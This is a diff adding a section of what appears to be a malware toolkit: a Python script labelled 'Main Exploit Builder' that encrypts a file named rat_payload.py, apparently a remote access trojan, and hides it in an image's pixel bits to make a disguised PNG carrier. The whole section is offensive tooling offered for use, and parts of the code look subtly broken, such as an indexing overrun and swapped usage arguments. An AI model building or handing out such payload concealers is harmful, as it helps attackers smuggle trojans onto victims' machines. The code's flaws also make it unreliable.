@@ -1,0 +1,55 @@
+## **3. image_encoder.py** (Main Exploit Builder)
+```python
+#!/usr/bin/env python3
+import sys
+from PIL import Image
+import os
+from cryptography.fernet import Fernet
+
+def encode_payload(image_path, output_path):
+    """Hide rat_payload.py inside image using LSB steganography"""
+    
+    # Read payload
+    with open("rat_payload.py", "rb") as f:
+        payload = f.read()
+    
+    # Encrypt payload
+    key = Fernet.generate_key()
+    fernet = Fernet(key)
+    encrypted_payload = fernet.encrypt(payload)
+    
+    # Convert to bytes for hiding
+    data = key + b"|" + encrypted_payload
+    data_bits = ''.join(format(byte, '08b') for byte in data)
+    
+    # Load image
+    img = Image.open(image_path)
+    pixels = list(img.getdata())
+    
+    # Hide data in LSB
+    new_pixels = []
+    data_index = 0
+    
+    for pixel in pixels:
+        if data_index < len(data_bits):
+            # Modify LSB of each color channel
+            r = (pixel[0] & 0xFE) | int(data_bits[data_index])
+            g = (pixel[1] & 0xFE) | int(data_bits[data_index + 1])
+            b = (pixel[2] & 0xFE) | int(data_bits[data_index + 2])
+            new_pixels.append((r, g, b))
+            data_index += 3
+        else:
+            new_pixels.append(pixel)
+    
+    # Save stego image
+    img.putdata(new_pixels)
+    img.save(output_path, "PNG")
+    print(f"[+] Payload hidden in {output_path}")
+    print(f"[+] Image size change: {os.path.getsize(image_path)} -> {os.path.getsize(output_path)} bytes")
+
+if __name__ == "__main__":
+    if len(sys.argv) != 3:
+        print("Usage: python image_encoder.py <output.png> <cover.jpg>")
+        sys.exit(1)
+    
+    encode_payload(sys.argv[2], sys.argv[1])
